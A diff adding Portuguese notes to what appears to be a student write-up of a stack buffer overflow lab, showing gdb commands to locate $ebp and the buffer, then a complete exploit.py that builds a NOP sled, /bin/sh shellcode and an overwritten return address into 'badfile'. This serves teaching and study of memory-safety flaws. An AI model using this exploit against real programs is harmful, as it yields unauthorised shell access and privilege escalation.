@@ -81,3 +81,52 @@ Agora, vamos correr o código em modo debug para conseguirmos descobrir a distâ
 gdb stack-L1-dbg
 ```
 
+Depois de meter um breakpoint na função **bof()**, executar o programa e dar alguns passos para a frente, podemos saber o endereço do **$ebp** da seguinte forma:
+
+```
+p $ebp
+```
+
+Que retornou `(void *) 0xffffcb18`.<br>
+Podemos fazer o mesmo para descobrir o endereço do buffer:
+
+```
+p &buffer
+```
+
+Que retornou `0xffffcaac`.<br>
+
+Por fim, alteramos o ficheiro `exploit.py` para ter os valores dos endereços obtidos. O ficheiro final ficou assim:
+
+```py
+#!/usr/bin/python3
+import sys
+
+# Replace the content with the actual shellcode
+shellcode= (
+  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
+  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
+  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
+).encode('latin-1')
+
+# Fill the content with NOP's (do nothing operation)
+content = bytearray(0x90 for i in range(517)) 
+
+##################################################################
+# Put the shellcode somewhere in the payload
+start = 517 - len(shellcode)
+content[start:start + len(shellcode)] = shellcode
+
+# Decide the return address value 
+# and put it somewhere in the payload
+ret    = 0xffffcb18 + 190
+offset = 0xffffcb18 - 0xffffcaac + 4
+
+L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
+content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
+##################################################################
+
+# Write the content to a file
+with open('badfile', 'wb') as f:
+  f.write(content)
+```
